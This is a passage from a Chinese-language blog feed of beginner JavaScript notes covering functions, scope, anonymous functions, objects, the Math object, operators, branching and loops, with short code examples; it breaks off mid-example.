        <content type="html"><![CDATA[<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="声明（定义）"><a href="#声明（定义）" class="headerlink" title="声明（定义）"></a>声明（定义）</h2><p>声明（定义）一个完整函数包括关键字、函数名、形式参数、函数体、返回值5个部分</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> 函数名(形式参数) &#123;</span><br><span class="line"><span class="comment">//函数体</span></span><br><span class="line"><span class="keyword">return</span> <span class="comment">//返回值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="调用"><a href="#调用" class="headerlink" title="调用"></a>调用</h2><p>声明（定义）的函数必须调用才会真正被执行，使用 <code>()</code> 调用函数。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sayHi</span>(<span class="params"></span>) &#123;  <span class="comment">//定义函数</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;嗨~&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">sayHi</span>()  <span class="comment">//调用函数</span></span><br></pre></td></tr></table></figure><h2 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h2><p>通过向函数传递参数，可以让函数更加灵活多变，参数可以理解成是一个变量。</p><p>声明（定义）一个功能为打招呼的函数</p><ul><li>传入数据列表</li><li>声明这个函数需要传入几个数据</li><li>多个数据用逗号隔开</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">sayHi</span>(<span class="params">name</span>) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(name)</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;嗨~&#x27;</span> + name)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">sayHi</span>(<span class="string">&#x27;小明&#x27;</span>) <span class="comment">// 结果为 小明</span></span><br><span class="line"><span class="title function_">sayHi</span>(<span class="string">&#x27;小红&#x27;</span>) <span class="comment">// 结果为 小红</span></span><br></pre></td></tr></table></figure><h2 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h2><p>通过 <code>return</code> 这个关键字，将内部执行结果传递到函数外部，这个被传递到外部的结果就是返回值。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">count</span>(<span class="params">a, b</span>) &#123;  <span class="comment">// 定义函数</span></span><br><span class="line">  <span class="keyword">let</span> s = a + b</span><br><span class="line">  <span class="keyword">return</span> s</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> total = <span class="title function_">count</span>(<span class="number">5</span>, <span class="number">12</span>)  <span class="comment">//将函数结果赋值给total</span></span><br></pre></td></tr></table></figure><ul><li>函数可以没有return，这种情况默认返回值为 <code>undefined</code></li></ul><h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><h3 id="全局作用域"><a href="#全局作用域" class="headerlink" title="全局作用域"></a>全局作用域</h3><p>作用于所有代码执行的环境(整个<code>script</code>标签内部)或者一个独立的<code>.js</code>文件</p><p>处于全局作用域内的变量，称为<strong>全局变量</strong></p><h3 id="局部作用域"><a href="#局部作用域" class="headerlink" title="局部作用域"></a>局部作用域</h3><p>作用于函数内的代码环境，就是局部作用域。 因为跟函数有关系，所以也称为函数作用域。</p><p>处于局部作用域内的变量称为<strong>局部变量</strong></p><h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p>函数可以分为<strong>具名函数</strong>和<strong>匿名函数</strong></p><p>匿名函数：没有名字的函数,<strong>无法直接使用</strong>。</p><h3 id="函数表达式"><a href="#函数表达式" class="headerlink" title="函数表达式"></a>函数表达式</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明</span></span><br><span class="line"><span class="keyword">let</span> fn = <span class="keyword">function</span>(<span class="params"></span>) &#123; </span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;函数表达式&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="title function_">fn</span>()</span><br><span class="line"><span class="comment">//在事件中使用</span></span><br><span class="line"><span class="keyword">let</span> btn = <span class="variable language_">document</span>.<span class="title function_">querySelector</span>(<span class="string">&#x27;button&#x27;</span>)</span><br><span class="line">btn.<span class="property">onclick</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="title function_">alert</span>(<span class="string">&#x27;这就是匿名函数&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="立即执行函数"><a href="#立即执行函数" class="headerlink" title="立即执行函数"></a>立即执行函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;xxxx&#125;)();</span><br><span class="line">(<span class="keyword">function</span>(<span class="params"></span>)&#123;xxxx&#125;());</span><br></pre></td></tr></table></figure><p>无需调用，立即执行，其实本质已经调用了</p><p>多个立即执行函数之间用<strong>分号</strong>隔开</p><h1 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h1><p>对象是 JavaScript 数据类型的一种，是一种数据集合。它由属性和方法两部分构成。</p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;&#125;  <span class="comment">//这是个空对象</span></span><br></pre></td></tr></table></figure><h2 id="属性和访问"><a href="#属性和访问" class="headerlink" title="属性和访问"></a>属性和访问</h2><p>数据描述性的信息称为<strong>属性</strong></p><ol><li>属性都是成对出现的，包括属性名和值，它们之间使用英文 <code>:</code> 分隔</li><li>多个属性之间使用英文 <code>,</code> 分隔</li><li>属性就是依附在对象上的变量</li><li>属性名可以使用 <code>&quot;&quot;</code> 或 <code>&#39;&#39;</code>，一般情况下省略，除非名称遇到特殊符号如空格、中横线等</li></ol><p>声明对象，并添加了若干属性后，可以使用 <code>.</code> 或 <code>[]</code> 获得对象中属性对应的值，我称之为属性访问。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;小明&#x27;</span>, <span class="comment">// 描述人的姓名</span></span><br><span class="line"><span class="attr">age</span>: <span class="number">18</span>, <span class="comment">// 描述人的年龄</span></span><br><span class="line"><span class="attr">stature</span>: <span class="number">185</span>, <span class="comment">// 描述人的身高</span></span><br><span class="line"><span class="attr">gender</span>: <span class="string">&#x27;男&#x27;</span>, <span class="comment">// 描述人的性别</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">name</span>) <span class="comment">// 结果为 小明</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">gender</span>) <span class="comment">// 结果为 男</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person[<span class="string">&#x27;stature&#x27;</span>]) <span class="comment">// 结果为 185</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(person.<span class="property">stature</span>) <span class="comment">// 结果同为 185</span></span><br><span class="line"><span class="comment">//也可以动态添加属性</span></span><br><span class="line">user.<span class="property">country</span> = <span class="string">&#x27;中国&#x27;</span></span><br><span class="line">user[<span class="string">&#x27;height&#x27;</span>] = <span class="number">186</span></span><br></pre></td></tr></table></figure><h2 id="方法和调用"><a href="#方法和调用" class="headerlink" title="方法和调用"></a>方法和调用</h2><p>数据行为性的信息称为方法，如跑步、唱歌等，一般是动词性的，其本质是函数。</p><ol><li>方法是由方法名和函数两部分构成，它们之间使用 : 分隔</li><li>多个属性之间使用英文 <code>,</code> 分隔</li><li>方法是依附在对象中的函数</li><li>方法名可以使用 <code>&quot;&quot;</code> 或 <code>&#39;&#39;</code>，一般情况下省略，除非名称遇到特殊符号如空格、中横线等</li></ol><p>声明对象，并添加了若干方法后，可以使用 <code>.</code> 或 <code>[]</code> 调用对象中函数，我称之为方法调用。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> person = &#123;</span><br><span class="line"><span class="attr">name</span>: <span class="string">&#x27;小红&#x27;</span>,</span><br><span class="line"><span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line"></span><br><span class="line"><span class="attr">singing</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;两只老虎，两只老虎，跑的快，跑的快...&#x27;</span>)</span><br><span class="line">&#125;,</span><br><span class="line"><span class="attr">run</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;我跑的非常快...&#x27;</span>)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 调用对象中 singing 方法</span></span><br><span class="line">person.<span class="title function_">singing</span>()</span><br><span class="line"><span class="comment">// 调用对象中的 run 方法</span></span><br><span class="line">person.<span class="title function_">run</span>()</span><br><span class="line"><span class="comment">// 也可以动态添加方法</span></span><br><span class="line">user.<span class="property">move</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;移动一点距离...&#x27;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：无论是属性或是方法，同一个对象中出现名称一样的，后面的会覆盖前面的。</p><h2 id="null"><a href="#null" class="headerlink" title="null"></a>null</h2><p>null 也是 JavaScript  中数据类型的一种，通常只用它来表示不存在的对象。使用 typeof 检测类型它的类型时，结果为 <code>object</code>。</p><h2 id="遍历对象"><a href="#遍历对象" class="headerlink" title="遍历对象"></a>遍历对象</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> obj = &#123;</span><br><span class="line">    <span class="attr">uname</span>: <span class="string">&#x27;alien&#x27;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">22</span>,</span><br><span class="line">    <span class="attr">sex</span>: <span class="string">&#x27;男&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> k <span class="keyword">in</span> obj) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(k)  <span class="comment">//打印属性名</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(obj[k])  <span class="comment">//打印属性值</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>for in 不提倡遍历数组，因为<code>k</code>是字符串</li></ul><h2 id="内置对象"><a href="#内置对象" class="headerlink" title="内置对象"></a>内置对象</h2><p>内置对象，例如：<code>console.log</code></p><h3 id="Math对象"><a href="#Math对象" class="headerlink" title="Math对象"></a>Math对象</h3><p><code>Math</code> 是 JavaScript 中内置的对象，称为数学对象，这个对象下即包含了属性，也包含了许多的方法。</p><h4 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h4><ul><li><code>Math.PI</code>，获取圆周率</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 圆周率</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Math</span>.<span class="property">PI</span>);</span><br></pre></td></tr></table></figure><h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 随机数，0 ~ 1 之间的随机数, 包含 0 不包含 1</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">random</span>()</span><br><span class="line"><span class="comment">// 舍弃小数部分，整数部分加1</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">ceil</span>(<span class="number">3.4</span>)</span><br><span class="line"><span class="comment">// 舍弃小数部分，整数部分不变</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="number">4.68</span>)</span><br><span class="line"><span class="comment">// 取整，四舍五入原则</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">round</span>(<span class="number">5.46539</span>)</span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">round</span>(<span class="number">4.849</span>)</span><br><span class="line"><span class="comment">// 找出最大值</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">max</span>(<span class="number">10</span>, <span class="number">21</span>, <span class="number">7</span>, <span class="number">24</span>, <span class="number">13</span>)</span><br><span class="line"><span class="comment">// 找出最小值</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">min</span>(<span class="number">24</span>, <span class="number">18</span>, <span class="number">6</span>, <span class="number">19</span>, <span class="number">21</span>)</span><br><span class="line"><span class="comment">// 求某个数的多少次方</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="number">4</span>, <span class="number">2</span>) <span class="comment">// 求 4 的 2 次方</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">pow</span>(<span class="number">2</span>, <span class="number">3</span>) <span class="comment">// 求 2 的 3 次方</span></span><br><span class="line"><span class="comment">// 求某数的平方根</span></span><br><span class="line"><span class="title class_">Math</span>.<span class="title function_">sqrt</span>(<span class="number">16</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端开发 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript-运算符、分支循环语句、数组</title>
      <link href="/2024/01/28/JavaScript-%E8%BF%90%E7%AE%97%E7%AC%A6%E3%80%81%E5%88%86%E6%94%AF%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%E3%80%81%E6%95%B0%E7%BB%84/"/>
      <url>/2024/01/28/JavaScript-%E8%BF%90%E7%AE%97%E7%AC%A6%E3%80%81%E5%88%86%E6%94%AF%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%E3%80%81%E6%95%B0%E7%BB%84/</url>
      
        <content type="html"><![CDATA[<h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p>进行运算后，<strong>直接赋值</strong>的操作</p><ul><li>赋值运算符：<code>+=</code>、<code>-=</code>、<code>*=</code>、<code>/=</code>、<code>%=</code></li><li>与C语言一样</li></ul><h2 id="一元运算符"><a href="#一元运算符" class="headerlink" title="一元运算符"></a>一元运算符</h2><p>当只需要<strong>加减1</strong>的时候，<code>++</code>为自增，<code>--</code>为自减</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> num = <span class="number">10</span></span><br><span class="line"><span class="comment">/*以自增为例，自减同理*/</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(++num)  <span class="comment">//前置自增，先增后赋值，输出11</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(num++)  <span class="comment">//后置自增，先赋值再增，输出11</span></span><br><span class="line"><span class="keyword">let</span> i = <span class="number">1</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(i++ + ++i + i)  <span class="comment">//例如这个，输出为7</span></span><br></pre></td></tr></table></figure><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><p>比较结果为boolean类型，即<code>true</code>（1）、<code>false</code>（0）</p><table><thead><tr><th>运算符</th><th>作用</th></tr></thead><tbody><tr><td>&gt;</td><td>左边是否大于右边</td></tr><tr><td>&lt;</td><td>左边是否小于右边</td></tr><tr><td>&gt;&#x3D;</td><td>左边是否大于或等于右边</td></tr><tr><td>&lt;&#x3D;</td><td>左边是否小于或等于右边</td></tr><tr><td>&#x3D;&#x3D;&#x3D;</td><td>左右两边是否<strong>类型</strong>和<strong>值</strong>都相等（重点）</td></tr><tr><td>&#x3D;&#x3D;</td><td>左右两边值是否相等</td></tr><tr><td>!&#x3D;</td><td>左右值不相等</td></tr><tr><td>!&#x3D;&#x3D;</td><td>左右两边是否不全等</td></tr><tr><td>注意：</td><td></td></tr></tbody></table><ul><li><code>=</code>：为赋值</li><li><code>==</code>：为判断</li><li><code>===</code>： 为全等</li></ul><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><table><thead><tr><th>符号</th><th>名称</th><th>日常读法</th><th>特点</th></tr></thead><tbody><tr><td>&amp;&amp;</td><td>逻辑与</td><td>并且</td><td>符号两边有一个假的结果为假</td></tr><tr><td>||</td><td>逻辑或</td><td>或者</td><td>符号两边有一个真的结果为真</td></tr><tr><td>!</td><td>逻辑非</td><td>取反</td><td>true变false false变true</td></tr></tbody></table><h2 id="运算符优先级"><a href="#运算符优先级" class="headerlink" title="运算符优先级"></a>运算符优先级</h2><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240128204000.png" alt="image.png"></p><h1 id="分支语句"><a href="#分支语句" class="headerlink" title="分支语句"></a>分支语句</h1><h2 id="if语句"><a href="#if语句" class="headerlink" title="if语句"></a>if语句</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="comment">/*条件1*/</span>)&#123;</span><br><span class="line"><span class="comment">//满足条件1执行的代码</span></span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="comment">/*条件2*/</span>)&#123;</span><br><span class="line"><span class="comment">//满足条件2执行的代码</span></span><br><span class="line">&#125;<span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">//所以都不满足执行的代码</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h2><p><strong>使用场景</strong>： 一些简单的双分支，可以使用 三元运算符（三元表达式），写起来比 if else双分支 更简单</p><p><strong>符号</strong>：? 与 : 配合使用</p><p>语法：</p><ul><li><code>条件 ? 表达式1 : 表达式2</code></li><li>如果条件为真，则执行表达式1</li><li>如果条件为假，则执行表达式2</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="number">5</span> &lt; <span class="number">3</span> ? <span class="string">&#x27;真的&#x27;</span> : <span class="string">&#x27;假的&#x27;</span>)  <span class="comment">//输出假的</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> num = <span class="number">1</span></span><br><span class="line">num = num &gt;= <span class="number">10</span> ? num : <span class="number">5</span> + num  <span class="comment">//将结果赋值给num</span></span><br><span class="line"><span class="title function_">alert</span>(num)  <span class="comment">//输出6</span></span><br></pre></td></tr></table></figure><h2 id="switch语句"><a href="#switch语句" class="headerlink" title="switch语句"></a>switch语句</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (<span class="number">2</span>) &#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;您选择的是1&#x27;</span>)</span><br><span class="line">  <span class="keyword">break</span>  <span class="comment">// 退出switch</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;您选择的是2&#x27;</span>)</span><br><span class="line">  <span class="keyword">break</span>  <span class="comment">// 退出switch</span></span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;您选择的是3&#x27;</span>)</span><br><span class="line">  <span class="keyword">break</span>  <span class="comment">// 退出switch</span></span><br><span class="line">  <span class="attr">default</span>:</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;没有符合条件的&#x27;</span>)</span><br></pre></td></tr></table></figure><h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><h2 id="断点调试（补充）"><a href="#断点调试（补充）" class="headerlink" title="断点调试（补充）"></a>断点调试（补充）</h2><p><strong>作用</strong>： 学习时可以帮助更好的理解代码运行，工作时可以更快找到bug</p><p>浏览器打开调试界面</p><ol><li>按F12打开开发者工具</li><li>点到源代码一栏 （ sources ）</li><li>选择代码文件</li></ol><p><strong>断点</strong>：在某句代码上加的标记就叫断点，当程序执行到这句有标记的代码时会暂停下来</p><p><img src="https://alien-blog.oss-cn-beijing.aliyuncs.com/20240128205228.png" alt="image.png"></p><h2 id="while循环"><a href="#while循环" class="headerlink" title="while循环"></a>while循环</h2><p>while : 在…. 期间， 所以 while循环 就是在满足条件期间，重复执行某些代码。</p><p><strong>语法：</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (i &lt;= <span class="number">3</span>) &#123;</span><br><span class="line">  <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;月薪过万不是梦，毕业时候见英雄~&lt;br&gt;&#x27;</span>)</span><br><span class="line">  i++   <span class="comment">// 这里千万不要忘了变量自增否则造成死循环</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>循环三要素：</p><ol><li>初始值 （经常用变量）</li><li>终止条件</li><li>变量的变化量</li></ol><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>for循环基本用法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">1</span>; i &lt;= <span class="number">6</span>; i++) &#123;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">`&lt;h<span class="subst">$&#123;i&#125;</span>&gt;循环控制，即重复执行&lt;h<span class="subst">$&#123;i&#125;</span>&gt;`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结论：</p><ul><li><code>JavaScript</code> 提供了多种语句来实现循环控制，但无论使用哪种语句都离不开循环的3个特征，即起始值、变化量、终止条件，做为初学者应着重体会这3个特征。</li><li>起始值、变化量、终止条件，由开发者根据逻辑需要进行设计，规避死循环的发生。</li><li>当如果明确了循环的次数的时候推荐使用<code>for</code>循环,当不明确循环的次数的时候推荐使用<code>while</code>循环</li></ul><p>嵌套for循环：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">1</span>; i &lt; <span class="number">4</span>; i++) &#123;</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">`第<span class="subst">$&#123;i&#125;</span>天 &lt;br&gt;`</span>)</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">1</span>; j &lt; <span class="number">6</span>; j++) &#123;</span><br><span class="line">        <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">`记住第<span class="subst">$&#123;j&#125;</span>个单词&lt;br&gt;`</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="中止循环"><a href="#中止循环" class="headerlink" title="中止循环"></a>中止循环</h2><p><code>break</code> 中止整个循环，一般用于结果已经得到, 后续的循环不需要的时候可以使用（提高效率）</p><p><code>continue</code> 中止本次循环，一般用于排除或者跳过某一个选项的时候</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//以while为例，for同理</span></span><br><span class="line"><span class="keyword">let</span> i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (i &lt;= <span class="number">5</span>) &#123;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(i)</span><br><span class="line"><span class="keyword">if</span> (i === <span class="number">3</span>) &#123;</span><br><span class="line"><span class="keyword">break</span>  <span class="comment">// 退出循环</span></span><br><span class="line">&#125;</span><br><span class="line">i++</span><br><span class="line">&#125;<span class="comment">//输出123</span></span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> (i &lt;= <span class="number">5</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (i === <span class="number">3</span>) &#123;</span><br><span class="line">i++</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(i)</span><br><span class="line">i++</span><br><span class="line">&#125;<span class="comment">//输出1245</span></span><br></pre></td></tr></table></figure><h2 id="无限循环"><a href="#无限循环" class="headerlink" title="无限循环"></a>无限循环</h2><p><code>while(true)</code> 和<code>for( ; ; )</code>来构造“无限”循环，需要使用break退出循环。（常用）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line"><span class="keyword">let</span> love = <span class="title function_">prompt</span>(<span class="string">&#x27;你爱我吗?&#x27;</span>)</span><br><span 